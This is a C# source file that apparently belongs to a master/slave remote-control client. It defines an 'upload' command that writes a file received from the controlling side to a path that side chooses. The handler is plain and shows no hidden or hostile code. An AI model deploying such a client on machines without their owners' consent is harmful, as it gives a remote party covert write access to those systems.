using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using Slave.Core;

namespace Slave.Commands
{
    internal class Upload : ICommand
    {
        public string name { get; } = "upload";

        public void Process(List<string> args)
        {
            try
            {
                using (var fs = new FileStream(args[1], FileMode.Create))
                {
                    SlaveNetworkManager.GetInstance().NetworkStreamToStream(fs);
                }

                SlaveNetworkManager.GetInstance().WriteLine("Success");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(args[1]);
                SlaveNetworkManager.GetInstance().WriteLine("Error");
            }
        }
    }
}
